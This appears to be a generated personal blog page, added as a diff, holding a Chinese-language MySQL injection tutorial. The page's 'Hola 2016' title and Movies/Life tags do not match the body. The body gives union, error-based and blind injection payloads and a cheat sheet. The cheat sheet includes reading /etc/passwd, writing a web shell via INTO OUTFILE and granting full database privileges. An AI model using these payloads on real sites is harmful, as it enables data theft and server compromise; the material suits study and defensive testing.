@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="马浩珍在 Github 上的个人博客">
+    <meta name="keyword" content="null">
+    <meta name="theme-color" content="#600090">
+    <meta name="msapplication-navbutton-color" content="#600090">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="#600090">
+    <link rel="shortcut icon" href="https://cdn4.iconfinder.com/data/icons/ionicons/512/icon-person-128.png">
+    <link rel="alternate" type="application/atom+xml" title="test" href="/atom.xml">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.css">
+    <title>
+        
+        Hola 2016｜Haojen&#39;s blog
+        
+    </title>
+
+    <link rel="canonical" href="http://haojen.github.io/2016/05/26/MysqlInjection/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/blog-style.css">
+
+    <!-- Pygments Github CSS -->
+    <link rel="stylesheet" href="/css/syntax.css">
+</head>
+
+<style>
+
+    header.intro-header {
+        background-image: url('//o7bkkhiex.bkt.clouddn.com/lion-blur-bg.jpg')
+    }
+</style>
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="" class="animated fadeIn">
+<!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost = "true" data-istags="false
+" data-ishome = "false" >
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand animated pulse" href="/">
+                <span class="brand-logo">
+                    test
+                </span>
+                's Blog
+            </a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <!-- /.navbar-collapse -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+					
+                    
+					
+					
+                </ul>
+            </div>
+        </div>
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+//    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+<!-- Main Content -->
+
+<!--only post-->
+
+
+<img class="wechat-title-img"
+     src="nullimg/post-default.jpg">
+
+
+<style>
+    
+    header.intro-header {
+        background-image: url('nullimg/post-default.jpg?imageView2/1/w/1400/h/400/interlace/1/q/90')
+    }
+
+    
+</style>
+
+<header class="intro-header">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <div class="post-heading">
+                    <h1>Hola 2016</h1>
+                    
+                    <h2 class="subheading">hi, I&#39;m haojen ma</h2>
+                    
+                    <span class="meta">
+                         作者 Haojen Ma
+                        <span>
+                          日期 2016-05-26
+                         </span>
+                    </span>
+                    <div class="tags text-center">
+                        
+                        <a class="tag" href="/tags/#Movies"
+                           title="Movies">Movies</a>
+                        
+                        <a class="tag" href="/tags/#Life"
+                           title="Life">Life</a>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="post-title-haojen">
+        <span>
+            Hola 2016
+        </span>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Container -->
+            <div class="col-lg-8 col-lg-offset-1 col-sm-9 post-container">
+                <p>#MySQL注入总结（所有例子均以数字型注入为例）</p>
+<p>##0x00 Union Injection</p>
+<ul>
+<li>判断注入点(数字型)</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">www.site.com/xxx.php?id=1</div><div class="line">www.site.com/xxx.php?id=1&apos; -&gt;不正常，可能存在注入</div></pre></td></tr></table></figure>
+<ul>
+<li>确定注入点</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">www.site.com/xxx.php?id=1 and 1=1 -&gt;正常</div><div class="line">www.site.com/xxx.php?id=1 and 1=2 -&gt;页面异常</div><div class="line"> 到此确认该注入点存在</div></pre></td></tr></table></figure>
+<ul>
+<li>确定当查询列数</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">www.site.com/xxx.php?id=1 order by 1 -&gt;正常</div><div class="line">www.site.com/xxx.php?id=1 order by 2 -&gt;正常</div><div class="line">.</div><div class="line">.</div><div class="line">.</div><div class="line">www.site.com/xxx.php?id=1 order by 6  -&gt;正常</div><div class="line">www.site.com/xxx.php?id=1 order by 7  -&gt;页面异常</div><div class="line">则查询的列数为6</div></pre></td></tr></table></figure>
+<ul>
+<li>确定 union 查询是否可用(此处以6列为例)</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">www.site.com/xxx.php?id=1 and 1=2 union select 1,2,3,4,5,6</div><div class="line">如果页面有回显1,2,3,4,5,6中的任意一个，则可以用union查询，这里假设回显的数字为1</div></pre></td></tr></table></figure>
+<ul>
+<li>确定相关信息(此处以mysql版本为例)</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">www.site.com/xxx.php?id=1  and 1=2 union select version(),2,3,4,5,6</div><div class="line"> 如果mysql的版本是5.0以上则可以查询information_schema数据库来注入，如果版本低于5.0，则只能用暴力猜解的方式</div></pre></td></tr></table></figure>
+<ul>
+<li>mysql5.0以上版本注入方法</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">1.获取当前数据库中的表</div><div class="line">www.site.com/xxx.php?id=1 and 1=2 union select group_concat(table_name) from information_schema.tables where table_schema=database()</div><div class="line">假设有user表</div><div class="line">2.获取某张表中的列</div><div class="line">www.site.com/xxx.php?id=1 and 1=2 union select group_concat(column_name) from information_schema.columns where table_name=0x75736572 &lt;表名的16进制（此处为user）&gt;</div><div class="line">假设有user，pass，id三个字段</div><div class="line">3.获取数据</div><div class="line">www.site.com/xxx.php?id=1 and 1=2 union select 1,concat(user,0x3a,pass,0x3a,id),3,4,5,6 from user</div><div class="line">其中0x3a是分隔符 :</div></pre></td></tr></table></figure>
+<p>##0x01 Error-based Injection</p>
+<ul>
+<li>场景<br>  此种注入适用于union查询不可用，但是页面有MySQL的报错信息</li>
+<li>原理</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">当group by的字段不一样而查询的结果已有一个，如查询 count(),sum()等时会出现如下错误：&quot;Duplicate entry xxxx for key &apos;group_key&apos;&quot;</div></pre></td></tr></table></figure>
+<ul>
+<li>POC</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">根据原理，我们构造出类似于以下的SQL语句:</div><div class="line">select count(*),CONCAT(version(),0x3a,ROUND(RAND()*2))a from information_schema.TABLES GROUP BY a </div><div class="line">或者</div><div class="line">select sum(version),CONCAT(version(),0x3a,ROUND(RAND()*2))a from information_schema.TABLES GROUP BY a </div><div class="line">(0x3a是分隔符:)会报如下的错误，就能拿到我们想要的信息了</div><div class="line">[Err] 1062 - Duplicate entry &apos;5.5.28:2&apos; for key &apos;group_key&apos;</div><div class="line">```	</div><div class="line">- 利用语句</div></pre></td></tr></table></figure>
+<p>www.site.com/xxx.php?id=1   -&gt;存在注入<br>此种方法的利用语句是:<br>www.site.com/xxx.php?id=1 and (select 1 from (payload)b) {payload为上面POC<br>中提到的构造的语句}<br>如，获取当前数据库中一张表名的注入语句为:<br>www.site.com/xxx.php?id=1 and (select 1 from (select count(<em>),CONCAT((select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a,ROUND(RAND()</em>2))a from information_schema.TABLES GROUP BY a)b)<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">## 0x02 Blind Injection</div><div class="line">- 场景</div></pre></td></tr></table></figure></p>
+<p>此种注入既不报错，union查询也不回显，SQL语句正确时返回正确页面，错误时返回异常页面<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">- 利用思路</div></pre></td></tr></table></figure></p>
+<p>充分利用数据库的特性和内置函数，通过一系列的暴力破解来达到获取数据的目的。举个例子,获取当前数据库名第一位的一种payload为:<br>select ascii(substr(database(),1,1)) from information_schema.tables limit 0,1<br>利用语句为:<br>www.site.com/xxx.php?id=1  and (select if((payload)&gt;99,1,0))  -&gt; 返回正确<br>www.site.com/xxx.php?id=1  and (select if((payload)&gt;100,1,0))  -&gt; 返回正确<br>www.site.com/xxx.php?id=1  and (select if((payload)&gt;101,1,0))  -&gt; 返回错误<br>则数据库第一位为 e（对应的ascii为101）<br>照此可以拿到所有想要的信息<br>```</p>
+<h2 id="0x03-Injection-Cheat-Sheet"><a href="#0x03-Injection-Cheat-Sheet" class="headerlink" title="0x03  Injection Cheat Sheet"></a>0x03  Injection Cheat Sheet</h2><table>
+<thead>
+<tr>
+<th style="text-align:left">说明</th>
+<th style="text-align:left">语句</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">Version</td>
+<td style="text-align:left">SELECT @@version</td>
+</tr>
+<tr>
+<td style="text-align:left">Comments</td>
+<td style="text-align:left">SELECT 1; #comment 或者 SELECT /*comment*/1;   </td>
+</tr>
+<tr>
+<td style="text-align:left">Current User</td>
+<td style="text-align:left">SELECT user() 和 SELECT system_user();</td>
+</tr>
+<tr>
+<td style="text-align:left">List Users</td>
+<td style="text-align:left">SELECT host, user, password FROM mysql.user;</td>
+</tr>
+<tr>
+<td style="text-align:left">List DBA Accounts</td>
+<td style="text-align:left">SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = ‘SUPER’;SELECT host, user FROM mysql.user WHERE Super_priv = ‘Y’;</td>
+</tr>
+<tr>
+<td style="text-align:left">Current Database</td>
+<td style="text-align:left">SELECT database()</td>
+</tr>
+<tr>
+<td style="text-align:left">List Databases</td>
+<td style="text-align:left">SELECT schema_name FROM information_schema.schemata; — for MySQL &gt;= v5.0</td>
+</tr>
+<tr>
+<td style="text-align:left"></td>
+</tr>
+<tr>
+<td style="text-align:left">List Columns</td>
+<td style="text-align:left">SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’</td>
+</tr>
+<tr>
+<td style="text-align:left">List Tables</td>
+<td style="text-align:left">SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’</td>
+</tr>
+<tr>
+<td style="text-align:left">Find Tables From Column Name</td>
+<td style="text-align:left">SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = ‘username’; — find table which have a column called ‘username’</td>
+</tr>
+<tr>
+<td style="text-align:left">Select Nth Row</td>
+<td style="text-align:left">SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 0; # rows numbered from 0</td>
+</tr>
+<tr>
+<td style="text-align:left"></td>
+</tr>
+<tr>
+<td style="text-align:left">Select Nth Char</td>
+<td style="text-align:left">SELECT substr(‘abcd’, 3, 1); # returns c</td>
+</tr>
+<tr>
+<td style="text-align:left">ASCII Value -&gt; Char</td>
+<td style="text-align:left">SELECT char(65); # returns A</td>
+</tr>
+<tr>
+<td style="text-align:left">Char -&gt; ASCII Value</td>
+<td style="text-align:left">SELECT ascii(‘A’); # returns 65</td>
+</tr>
+<tr>
+<td style="text-align:left">String Concatenation</td>
+<td style="text-align:left">SELECT CONCAT(‘A’,’B’,’C’); # returns ABC</td>
+</tr>
+<tr>
+<td style="text-align:left">If Statement</td>
+<td style="text-align:left">SELECT if(1=1,’foo’,’bar’); — returns ‘foo’</td>
+</tr>
+<tr>
+<td style="text-align:left">Case Statement</td>
+<td style="text-align:left">SELECT CASE WHEN (1=1) THEN ‘A’ ELSE ‘B’ END; # returns A</td>
+</tr>
+<tr>
+<td style="text-align:left">Avoiding Quotes</td>
+<td style="text-align:left">SELECT 0×414243; # returns ABC</td>
+</tr>
+<tr>
+<td style="text-align:left">Time Delay</td>
+<td style="text-align:left">SELECT BENCHMARK(1000000,MD5(‘A’));SELECT SLEEP(5);</td>
+</tr>
+<tr>
+<td style="text-align:left">Local File Access</td>
+<td style="text-align:left">UNION ALL SELECT LOAD_FILE(‘/etc/passwd’) 和SELECT * FROM mytable INTO dumpfile ‘/tmp/somefile’;和select ‘xxx’ into outfile ‘/var/www/shell.php’</td>
+</tr>
+<tr>
+<td style="text-align:left">Create Users</td>
+<td style="text-align:left">CREATE USER test1 IDENTIFIED BY ‘pass1′;</td>
+</tr>
+<tr>
+<td style="text-align:left">Delete Users</td>
+<td style="text-align:left">DROP USER test1;</td>
+</tr>
+<tr>
+<td style="text-align:left">Make User DBA</td>
+<td style="text-align:left">GRANT ALL PRIVILEGES ON <em>.</em> TO test1@’%’;</td>
+</tr>
+</tbody>
+</table>
+
+                <hr>
+                
+
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/2017/03/12/hello-world/" data-toggle="tooltip" data-placement="top"
+                           title="Hello World">&larr; Previous Post</a>
+                    </li>
+                    
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+
+            <div class="hidden-xs col-sm-3 toc-col">
+                <div class="toc-wrap">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Injection-Cheat-Sheet"><span class="toc-text">0x03  Injection Cheat Sheet</span></a></li></ol>
+                </div>
+            </div>
+        </div>
+
+        <div class="row">
+            <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5 class="text-center">
+                        <a href="/tags/">FEATURED TAGS</a>
+                    </h5>
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/#Movies"
+                           title="Movies">Movies</a>
+                        
+                        <a class="tag" href="/tags/#Life"
+                           title="Life">Life</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+            </div>
+        </div>
+
+    </div>
+</article>
+
+
+
+
+
+
+<!-- Footer -->
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <br>
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; test 2017
+                    <br>
+                    <span id="busuanzi_container_site_pv" style="font-size: 12px;">PV: <span id="busuanzi_value_site_pv"></span> Times</span>
+                    <br>
+                    Theme by <a href="https://haojen.github.io/">Haojen Ma</a>
+                </p>
+
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/blog.js"></script>
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("http://haojen.github.io/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+<!-- Google Analytics -->
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- swiftype -->
+<script type="text/javascript">
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+  (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+  e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+  _st('install','null','2.0.0');
+</script>
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<!--wechat title img-->
+<img class="wechat-title-img" src="null">
+</body>
+
+</html>
